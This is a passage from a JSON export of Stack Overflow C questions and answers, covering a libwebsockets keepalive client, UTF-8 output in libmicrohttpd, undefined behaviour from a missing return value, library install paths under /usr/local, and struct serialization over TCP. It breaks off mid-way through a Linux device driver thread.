protocol.rx_buffer_size = 0;                                                                       \n  protocol.id = 0;                                                                                   \n  protocol.user = NULL;                                                                              \n\n  context = lws_create_context(&amp;info); \n</code></pre>\n\n<p>Tasker Client Watchdog Thread Call</p>\n\n<pre><code>if (context == NULL) {                                                                             \n    printf(KRED\"[Main Service] context is NULL.\\n\"RESET);                                            \n    return -1;                                                                                       \n  }                                                                                                  \n\n  wsz = lws_client_connect(context, \"xxx.xxx.xxx.xxx\",5000, 0,                                       \n                           \"/\", \"xxx.xxx.xxx.xxx:5000\", NULL,                                        \n                           protocol.name, -1);                                                       \n\n  if (wsz == NULL) {                                                                                 \n    printf(KRED\"[Main] wsi create error.\\n\"RESET);                                                   \n    return -1;                                                                                       \n  }                                                                                                  \n  reco = false;                                                                                      \n  printf(KGRN\"[Main] wsi create success.\\n\"RESET);                                                   \n\n  printf(KRED\"[Main Service] %d\\n\", ConnOk, RESET);                                                  \n\n  keepAlive =  g_thread_try_new(\"KeepAliveLoop\", keep_alive_routine, context, NULL);                 \n\n  while(!dead)                                                                                       \n    lws_service(context, 50);                                                                        \n\n  lws_context_destroy(context);                                                                      \n\n  return 0;                                                                                          \n}   \n</code></pre>\n\n<p>Finnaly The Tasker Client Thread routine Loop and Thread Loop Execution code</p>\n\n<pre><code>static void keep_alive_loop()                                                                        \n{                                                                                                    \n  json_t *hb = NULL;                                                                                 \n  char *toto = NULL;                                                                                 \n\n    if (reco == true)                                                                                \n   {                                                                                                 \n     wsz = lws_client_connect(context, \"xxx.xxx.xxx.xxx\",5000, 0,                                    \n                              \"/\", \"xxx.xxx.xxx.xxx:5000\", NULL,                                     \n                              protocol.name, -1);                                                    \n     printf(KRED\"[Main Service] UNDER LOOOOOOPING .\\n\"RESET);                                        \n     reco = false;                                                                                   \n     return;                                                                                         \n   }                                                                                                 \n\n    hb = json_object();                                                                              \n    json_object_set_new(hb, \"zetapush\", json_string(\"keepalive\"));                                   \n    json_object_set_new(hb, \"timeout\", json_integer(8000));                                          \n    toto = json_dumps(hb, 0);                                                                        \n    websocket_client_keep_alive_write_back(hb);                                                      \n    lws_callback_on_writable(wsz);                                                                   \n}                                                                                                    \n\nstatic void *keep_alive_routine(void *data)                                                          \n{                                                                                                    \n  printf(KBRN\"[pthread_routine] WATCHDOG READY AND ANGRY .\\n\"RESET);                                 \n\n  g_timeout_add_seconds(8, keep_alive_loop, NULL);                                                   \n  alive_loop = g_main_loop_new(NULL, 0);                                                             \n  g_main_loop_run(alive_loop);                                                                       \n}  \n</code></pre>\n\n<p>If any further precision is needed let me know, i can also upload to github for better reading, any help or hint would be much appreciated :). </p>\n"}, {"tags": ["html", "c", "http", "unicode", "server"], "comments": [{"owner": {"reputation": 319, "user_id": 2320942, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f429c4e4078f92da8112933a2a3d3e0c?s=128&d=identicon&r=PG", "display_name": "Alok Saini", "link": "https://stackoverflow.com/users/2320942/alok-saini"}, "edited": false, "score": 0, "creation_date": 1482923479, "post_id": 41360391, "comment_id": 69922828, "body": "i did that but no luck."}, {"owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 0, "creation_date": 1482924381, "post_id": 41360391, "comment_id": 69923293, "body": "Have a look here: <a href=\"http://stackoverflow.com/questions/1696619/displaying-unicode-symbols-in-html\" title=\"displaying unicode symbols in html\">stackoverflow.com/questions/1696619/&hellip;</a>. Be sure your string is formatted in UTF-8. If you&#39;re using a C11 compiler prefix string with <code>u8</code> as: <code>char *page = u8&quot;&lt;html&gt;&lt;head&gt;&lt;meta charset=&#39;UTF-8&#39;&gt;&lt;&#47;head&gt;&lt;body&gt;\u0939\u0948\u0932\u094b \u092f\u0942\u0928\u093f\u0915\u094b\u0921&lt;&#47;body&gt;&lt;&#47;html&gt;&quot;;</code>"}, {"owner": {"reputation": 319, "user_id": 2320942, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f429c4e4078f92da8112933a2a3d3e0c?s=128&d=identicon&r=PG", "display_name": "Alok Saini", "link": "https://stackoverflow.com/users/2320942/alok-saini"}, "reply_to_user": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 0, "creation_date": 1482925018, "post_id": 41360391, "comment_id": 69923621, "body": "yea that worked!!!! thank you, add this as an answer, i will mark as correct"}], "answers": [{"tags": [], "owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "is_accepted": true, "score": 2, "last_activity_date": 1482928251, "creation_date": 1482928251, "answer_id": 41362222, "question_id": 41360391, "link": "https://stackoverflow.com/questions/41360391/unicode-html-buffers-not-working-with-libmicrohttpd/41362222#41362222", "title": "Unicode html buffers not working with libmicrohttpd", "body": "<p>As I already wrote in the comment you have to be sure that your string is formatted in UTF-8. Standard <code>char</code> type formats string as per the selected codepage or local, that gives bad formed characters if interpreted as UTF-8.</p>\n\n<p>If you're using a C11 compiler prefix string with <code>u8</code> as: </p>\n\n<pre><code>char *page = u8\"&lt;html&gt;&lt;head&gt;&lt;meta charset='UTF-8'&gt;&lt;/head&gt;&lt;body&gt;\u0939\u0948\u0932\u094b \u092f\u0942\u0928\u093f\u0915\u094b\u0921&lt;/body&gt;&lt;/html&gt;\";\n</code></pre>\n\n<p>If your compiler doesn't support UTF-8 you need an external tool that formats the string using hex escaping or octal or the like.</p>\n"}], "owner": {"reputation": 319, "user_id": 2320942, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f429c4e4078f92da8112933a2a3d3e0c?s=128&d=identicon&r=PG", "display_name": "Alok Saini", "link": "https://stackoverflow.com/users/2320942/alok-saini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 143, "favorite_count": 0, "accepted_answer_id": 41362222, "answer_count": 1, "score": 0, "last_activity_date": 1482928251, "creation_date": 1482921977, "question_id": 41360391, "link": "https://stackoverflow.com/questions/41360391/unicode-html-buffers-not-working-with-libmicrohttpd", "title": "Unicode html buffers not working with libmicrohttpd", "body": "<p>I am trying to create a server which will server pages in non English language, and i am testing libmicrohttpd with this code:</p>\n\n<pre><code>static int\nanswer_to_connection(void* cls, struct MHD_Connection* connection,\n                     const char* url, const char* method,\n                     const char* version, const char* upload_data,\n                     size_t* upload_data_size, void** con_cls)\n{\n    char *page = \"&lt;html&gt;&lt;head&gt;&lt;meta charset='UTF-8'&gt;&lt;/head&gt;&lt;body&gt;\u0939\u0948\u0932\u094b \u092f\u0942\u0928\u093f\u0915\u094b\u0921&lt;/body&gt;&lt;/html&gt;\";\n\n\n    struct MHD_Response* response;\n    int ret;\n\n    response =\n        MHD_create_response_from_buffer(strlen(page), (void *)page,\n                                        MHD_RESPMEM_PERSISTENT);\n\n    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);\n    MHD_destroy_response(response);\n\n    return ret;\n}\n</code></pre>\n\n<p>But its not working and giving ????? characters on the browser.\nCan anyone tell me if libmicrohttpd supports Unicode, if yes then how?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1482921760, "post_id": 41360284, "comment_id": 69921956, "body": "XY problem: why don&#39;t you want to return c ?"}, {"owner": {"reputation": 293, "user_id": 7182347, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-i61AH4iaNcA/AAAAAAAAAAI/AAAAAAAAAFU/uf7R62glAtc/photo.jpg?sz=128", "display_name": "Sanjay Idpuganti", "link": "https://stackoverflow.com/users/7182347/sanjay-idpuganti"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1482952870, "post_id": 41360284, "comment_id": 69938363, "body": "@Jean-Fran&#231;oisFabre i just wanted to know how c is returned without explicitly stating it."}], "answers": [{"comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 3, "creation_date": 1482922041, "post_id": 41360323, "comment_id": 69922083, "body": "you could explain that the value is probably in the stack and took as return valude but it&#39;s pure luck and implementation dependent."}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 5, "last_activity_date": 1482922186, "last_edit_date": 1482922186, "creation_date": 1482921791, "answer_id": 41360323, "question_id": 41360284, "link": "https://stackoverflow.com/questions/41360284/what-is-the-return-value-of-the-function/41360323#41360323", "title": "What is the return value of the function", "body": "<p>It's <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\"><em>undefined behaviour</em></a>.</p>\n\n<p>When a function that's supposed to return a value doesn't do so <em>and</em> the caller uses the return value, it's <em>undefined</em>. Anything you might observe is purely accidental/platform specific behaviour and not be relied upon. The C standard certainly makes no guarantees.</p>\n\n<p>From C11 draft, <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.9.1p12\" rel=\"nofollow noreferrer\">6.9.1 Function definitions/12</a>:</p>\n\n<blockquote>\n  <p>If the } that terminates a function is reached, and the value of the\n  function call is used by the caller, the behavior is undefined.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 8510, "user_id": 6040181, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh3.googleusercontent.com/-dQXdInUPrE0/AAAAAAAAAAI/AAAAAAAAAdg/_OLdfGWclsw/photo.jpg?sz=128", "display_name": "Biagio Festa", "link": "https://stackoverflow.com/users/6040181/biagio-festa"}, "is_accepted": true, "score": 1, "last_activity_date": 1482925216, "creation_date": 1482925216, "answer_id": 41361337, "question_id": 41360284, "link": "https://stackoverflow.com/questions/41360284/what-is-the-return-value-of-the-function/41361337#41361337", "title": "What is the return value of the function", "body": "<p>The @P.P.'s answer is right: that's an undefined behaviour.</p>\n\n<p>What really happens, instead it strongly depends on the compiler implementation.\nThe most likely scenario is that the caller function will take a return value anyway. Since the callee function does not return any value, that means the caller function will take a \"random\"-dirty value from the stack.</p>\n\n<p>I'm going to provide you an example with GCC compiler (without any optimisations):</p>\n\n<p>This is the assembly code for the function <code>add</code>:</p>\n\n<pre><code>push   %rbp\nmov    %rsp,%rbp\nmov    %edi,-0x14(%rbp)\nmov    %esi,-0x18(%rbp)\nmov    -0x14(%rbp),%edx\nmov    -0x18(%rbp),%eax\nadd    %edx,%eax\nmov    %eax,-0x4(%rbp)\nnop\nnop\npop    %rbp\nretq\n</code></pre>\n\n<p>As you can see, the addition is performed, stored in the <code>c</code> variable.\nThe result value is luckily stored in <code>%eax</code> register, but this has not been done for purpose.</p>\n\n<p>Here there is the assembly code of the <em>correct</em> function:</p>\n\n<pre><code>push   %rbp\nmov    %rsp,%rbp\nmov    %edi,-0x14(%rbp)\nmov    %esi,-0x18(%rbp)\nmov    -0x14(%rbp),%edx\nmov    -0x18(%rbp),%eax\nadd    %edx,%eax\nmov    %eax,-0x4(%rbp)\nmov    -0x4(%rbp),%eax   &lt;====\npop    %rbp\nretq  \n</code></pre>\n\n<p>As you can see, the value stored in <code>c</code> is properly moved in the <code>%eax</code> register (with the instruction marked with the <code>&lt;====</code>).</p>\n\n<p>In the <code>main</code> function (the caller), instead, the assembly is:</p>\n\n<pre><code>callq  0x400542 &lt;add&gt;\nmov    %eax,%ecx\n</code></pre>\n\n<p>As you can see the caller function, after the call of the function, take the \"return value\" which is supposed to be in <code>%eax</code> register.</p>\n\n<p>This means despite the fact that callee function returns actually a value or not, the <em>caller</em> function will takes a return value anyway.</p>\n\n<p>In the example I've just shown you, the return value the caller takes is <code>%eax</code> register.</p>\n\n<p>In conclusion if the <em>callee</em> function does not return a proper value the <em>caller</em> function (main) will take anyway what is stored in <code>%eax</code> register (which can be a dirty value if the callee does not return proper a value).</p>\n"}], "owner": {"reputation": 293, "user_id": 7182347, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-i61AH4iaNcA/AAAAAAAAAAI/AAAAAAAAAFU/uf7R62glAtc/photo.jpg?sz=128", "display_name": "Sanjay Idpuganti", "link": "https://stackoverflow.com/users/7182347/sanjay-idpuganti"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 180, "favorite_count": 0, "accepted_answer_id": 41361337, "answer_count": 2, "score": 0, "last_activity_date": 1482925216, "creation_date": 1482921672, "question_id": 41360284, "link": "https://stackoverflow.com/questions/41360284/what-is-the-return-value-of-the-function", "title": "What is the return value of the function", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nint add(int, int);\n\nint main(int argc, char const *argv[])\n{\n    int a = 2, b = 3;\n    printf(\"%d %d %d\\n\", a, b, add(a, b));\n    return 0;\n}\n\nint add(int a, int b) {\n    int c = a + b;\n    return;\n}\n</code></pre>\n\n<p><strong>The output of the above program is 2 3 5 how can the add function return c without explicitly returning it</strong></p>\n"}, {"tags": ["c", "cmake", "shared-libraries"], "comments": [{"owner": {"reputation": 6940, "user_id": 1559401, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/t9DjW.jpg?s=128&g=1", "display_name": "rbaleksandar", "link": "https://stackoverflow.com/users/1559401/rbaleksandar"}, "edited": false, "score": 0, "creation_date": 1482922346, "post_id": 41360283, "comment_id": 69922222, "body": "Why not install in <code>&#47;opt</code>? The <code>&#47;opt</code> folder is meant for additional software which is not installed via standard means that is through a package manager or similar. You can then use <code>set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} &lt;dir_in_opt_where_your_lib_is&gt;)</code> inside a project which uses the library. As for the structure of the installation folder - it really depends on what the library&#39;s structure is. Especially for libs that use C++ templates (where the library is actually inside the header files) it&#39;s not uncommon to not have an include."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 6940, "user_id": 1559401, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/t9DjW.jpg?s=128&g=1", "display_name": "rbaleksandar", "link": "https://stackoverflow.com/users/1559401/rbaleksandar"}, "edited": false, "score": 0, "creation_date": 1482922760, "post_id": 41360283, "comment_id": 69922432, "body": "I always thought that &quot;make install&quot; was considered &quot;standard means&quot;: am I wrong? As for the CMAKE_MODULE_PATH: I can certainly use that approach, but that does not defeat the purpose of having common directories where the system automatically looks fro *.so and *.h?"}, {"owner": {"reputation": 16953, "user_id": 2799037, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/2uPVa.png?s=128&g=1", "display_name": "usr1234567", "link": "https://stackoverflow.com/users/2799037/usr1234567"}, "edited": false, "score": 0, "creation_date": 1482925192, "post_id": 41360283, "comment_id": 69923723, "body": "This question is unrelated to both C and CMake. Probably even unrelated to programming. Regarding CMake: the install prefix can be changed, but /usr/bin et al. is a sane default choice."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482925549, "post_id": 41360283, "comment_id": 69923925, "body": "I can agree that the question is unrelated to both C and CMake (I put them as labels only to give context): this question is all about deployment. As for the &quot;/usr/bin&quot; location: I understand even CMake set it as default choice when perfoming &quot;sudo make install&quot; (if the user didn&#39;t add anything in ./configure phase)... but what about the &quot;headers&quot; conflicts? Is just me being too paranoid?"}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 3, "creation_date": 1482926219, "post_id": 41360283, "comment_id": 69924335, "body": "1. Approaches for libraries and headers locations could be different: you should place <b>library directly</b> into <code>&#47;usr&#47;local&#47;lib</code> (otherwise linker will unable to find them) but may place <b>headers under subfolder</b> of <code>&#47;usr&#47;local&#47;include</code> (so them will not be mixed with headers from other libraries). 2. The question itsels is <i>opinion-based</i>, as there is <b>no universal rule</b> about installing locations. As a simple but widely used approach you may use install directories from <a href=\"https://cmake.org/cmake/help/v3.0/module/GNUInstallDirs.html\" rel=\"nofollow noreferrer\">GNUInstallDirs</a> CMake module."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 1, "creation_date": 1482926565, "post_id": 41360283, "comment_id": 69924520, "body": "@Tsyvarev: I thought this process was well-standardized... i didn&#39;t realize it was actually a very debatable topic. I think your comment is at the moment the most clarifying one. +1 also citing the standard: it always helps. If you can make your comment an answer I will +1 it. (After some days, if no other approaches are posted, I will mark the answer as accepted)"}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": true, "score": 3, "last_activity_date": 1548770410, "creation_date": 1548770410, "answer_id": 54422763, "question_id": 41360283, "link": "https://stackoverflow.com/questions/41360283/subfolders-in-usr-local-lib/54422763#54422763", "title": "Subfolders in /usr/local/lib?", "body": "<ol>\n<li>Approaches for libraries and headers locations could be different: you should place <b>library directly</b> into <code>&#47;usr&#47;local&#47;lib</code> (otherwise linker will unable to find them) but may place <b>headers under subfolder</b> of <code>&#47;usr&#47;local&#47;include</code> (so them will not be mixed with headers from other libraries).</li>\n<li>The question itsels is <i>opinion-based</i>, as there is <b>no universal rule</b> about installing locations. As a simple but widely used approach you may use install directories from <a href=\"https://cmake.org/cmake/help/v3.0/module/GNUInstallDirs.html\" rel=\"nofollow noreferrer\">GNUInstallDirs</a> CMake module.</li>\n</ol>\n\n<p>&ndash;&nbsp;Tsyvarev</p>\n"}], "owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1302, "favorite_count": 2, "accepted_answer_id": 54422763, "answer_count": 1, "score": 5, "last_activity_date": 1548770410, "creation_date": 1482921671, "question_id": 41360283, "link": "https://stackoverflow.com/questions/41360283/subfolders-in-usr-local-lib", "title": "Subfolders in /usr/local/lib?", "body": "<p>I'm developing a simple C shared library for my university using Cmake.\nAt the moment I'm developing the install procedure of my *.so and my .*h files.</p>\n\n<p>Where should I put the so and the header files when the user runs the famous <code>sudo make install</code>?\nFrom what I understand:</p>\n\n<ol>\n<li>I shouldn't put them in <code>/usr/lib</code> and <code>/usr/include</code> since those folders are reserved for distribution packages; </li>\n<li>I shouldn't put them in <code>/lib</code> and <code>/include</code> since those folders are reserved for OS boot packages;</li>\n</ol>\n\n<p>That leaves me with <code>usr/local/lib</code> and <code>/usr/local/include</code>. However I can't decide whether or not I should put my files in a subfolder:</p>\n\n<ol>\n<li>Putting the files directly inside <code>usr/local/lib</code> and <code>/usr/local/include</code> will make them directly available in the system but they will remain unorganized with all the other files in the folders. More disturbing fact is that if someone installs another shared library whose header has the same name of mine, unknown behaviours may happen;</li>\n<li>Putting the files in a subfolder (<code>/usr/local/lib/myAwesomeProject/</code> and <code>/usr/local/include/myAwesomeProject</code>) will avoid the behaviours above, but will prevent the system to automatically detect my libraries (from what I understand the system automatically looks for include and library only in specific directories <strong>non-recursively</strong>): so if the system looks into <code>/usr/local/include</code>, my includes won't be found because of the subfolder!</li>\n</ol>\n\n<p>To help you, here's my system:</p>\n\n<ul>\n<li>OS system: Ubuntu 16.4 (64 bit virtualized on Windows 10 64-bit);</li>\n<li>CPU (not that I think is useful): Intel\u00ae Core\u2122 i5-3230M CPU @ 2.60GHz \u00d7 2;</li>\n</ul>\n\n<p>Thanks for any kind reply! </p>\n"}, {"tags": ["c", "sockets", "serialization", "memory-management", "tcp-ip"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 2, "creation_date": 1482921469, "post_id": 41360104, "comment_id": 69921787, "body": "There is a laundry list of reasons to exercise caution when pushing structures in memory-layout form across a wire to a foreign host, <a href=\"https://en.wikipedia.org/wiki/Endianness\" rel=\"nofollow noreferrer\">endianness</a> and platform <a href=\"http://stackoverflow.com/questions/4306186/structure-padding-and-packing\">padding and packing</a> being near the top of the list. If what you&#39;re doing is &quot;working&quot;, make sure it is doing so by design, and not by chance."}], "answers": [{"tags": [], "owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "is_accepted": false, "score": 0, "last_activity_date": 1482921506, "creation_date": 1482921506, "answer_id": 41360241, "question_id": 41360104, "link": "https://stackoverflow.com/questions/41360104/serialization-in-c-with-malloc/41360241#41360241", "title": "Serialization in C with malloc", "body": "<p>There is a severe flaw in your approach.\nYou have no influence on the memory layout of your structure. The compiler might add padding bytes between struc members. If you have different compilers and CPUs on both ends of the connection, your approach using a simple struct will fail. Not to mention different endianess on different hardware.</p>\n\n<p>Therefore it's not a good idea.</p>\n"}, {"tags": [], "owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "is_accepted": false, "score": 0, "last_activity_date": 1482921834, "creation_date": 1482921834, "answer_id": 41360337, "question_id": 41360104, "link": "https://stackoverflow.com/questions/41360104/serialization-in-c-with-malloc/41360337#41360337", "title": "Serialization in C with malloc", "body": "<p>Using structs for serialization over local inter thread/process communications is okay under same compiler and compiling flags.\nBut isn't good idea for network communications. clients on the network may have different CPU arch or operating system and there isn't any guarantee that memory allocation for struct members will be constant on different machines, for example sizeof(int) may differ in X86 and X86_64 or other architecture/compiler. the memory layout is defined by compiler and may vary on different machines even different operating systems, also paddings and endiannes are coming in and changes the memory layout too.</p>\n"}, {"tags": [], "owner": {"reputation": 379, "user_id": 6887540, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ixWUU.png?s=128&g=1", "display_name": "staringlizard", "link": "https://stackoverflow.com/users/6887540/staringlizard"}, "is_accepted": true, "score": 0, "last_activity_date": 1482921973, "creation_date": 1482921973, "answer_id": 41360389, "question_id": 41360104, "link": "https://stackoverflow.com/questions/41360104/serialization-in-c-with-malloc/41360389#41360389", "title": "Serialization in C with malloc", "body": "<p>When doing this you have to consider two things:</p>\n\n<pre><code>1. Endianness\n2. Compiler padding\n</code></pre>\n\n<p>The first point will make the data take on different form depending on the endianness of your system. This is a problem for types bigger than a byte.</p>\n\n<p>For the second point you will need to make sure that the compiler is not adding any bytes between the members in your structure. This can be done with compiler pragmas.</p>\n"}], "owner": {"reputation": 58, "user_id": 5359093, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21aa6b0a8ce24335ac8035edb634f834?s=128&d=identicon&r=PG&f=1", "display_name": "Sanjo", "link": "https://stackoverflow.com/users/5359093/sanjo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125, "favorite_count": 0, "accepted_answer_id": 41360389, "answer_count": 3, "score": 1, "last_activity_date": 1482921973, "creation_date": 1482921065, "question_id": 41360104, "link": "https://stackoverflow.com/questions/41360104/serialization-in-c-with-malloc", "title": "Serialization in C with malloc", "body": "<p>Searching all the web for ways to serialize data in C so I could send a struct over a  TCP/IP socket, I couldn't find anything simple. But I think that this way, you can fix the positions of the bits in a packet and thus serialize it \"de facto\".</p>\n\n<pre><code>packet *datapkt = NULL;\ndatapkt = (packet*)malloc(PKT_SIZE); // Allocation of memory with this size\ndatapkt-&gt;field = data;\n......\nsend(datapkt);\nfree(datapkt);\n</code></pre>\n\n<p>Can anyone tell me if is this a good idea? This far it's working in my project.</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["c", "linux-kernel", "linux-device-driver"], "comments": [{"owner": {"reputation": 1283, "user_id": 3897333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51d784367ca82572dea0a2c43217770b?s=128&d=identicon&r=PG", "display_name": "Paul Stelian", "link": "https://stackoverflow.com/users/3897333/paul-stelian"}, "edited": false, "score": 0, "creation_date": 1482922170, "post_id": 41359672, "comment_id": 69922140, "body": "Reading should copy to user the entire buffer to be read, not just one character. Also beware when you wait that the condition may still be unsatisfied after the wait; in that case you should return -EINTR. On the writing side things are actually looking alright"}, {"owner": {"reputation": 1283, "user_id": 3897333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51d784367ca82572dea0a2c43217770b?s=128&d=identicon&r=PG", "display_name": "Paul Stelian", "link": "https://stackoverflow.com/users/3897333/paul-stelian"}, "edited": false, "score": 0, "creation_date": 1482922257, "post_id": 41359672, "comment_id": 69922183, "body": "Also we expect 1234\\n5\\n to be the content after the echo commands (cat would show 1234 and 5 on separate lines)"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 1283, "user_id": 3897333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51d784367ca82572dea0a2c43217770b?s=128&d=identicon&r=PG", "display_name": "Paul Stelian", "link": "https://stackoverflow.com/users/3897333/paul-stelian"}, "edited": false, "score": 0, "creation_date": 1482922288, "post_id": 41359672, "comment_id": 69922194, "body": "@PaulStelian Post an answer :p."}, {"owner": {"reputation": 1283, "user_id": 3897333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51d784367ca82572dea0a2c43217770b?s=128&d=identicon&r=PG", "display_name": "Paul Stelian", "link": "https://stackoverflow.com/users/3897333/paul-stelian"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482922364, "post_id": 41359672, "comment_id": 69922231, "body": "@Stargateur I will only post as answer what definitely or most likely is a problem, not guesses (even if they are educated guesses)"}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1482966352, "post_id": 41359672, "comment_id": 69943594, "body": "On read you return length on erroneous case?!"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 7349116, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b06f9b8fc0adc2bd4e210dcf55ec0149?s=128&d=identicon&r=PG", "display_name": "Akihito", "link": "https://stackoverflow.com/users/7349116/akihito"}, "edited": false, "score": 0, "creation_date": 1482923074, "post_id": 41360472, "comment_id": 69922582, "body": "I have changed it but I still get:"}, {"owner": {"reputation": 3, "user_id": 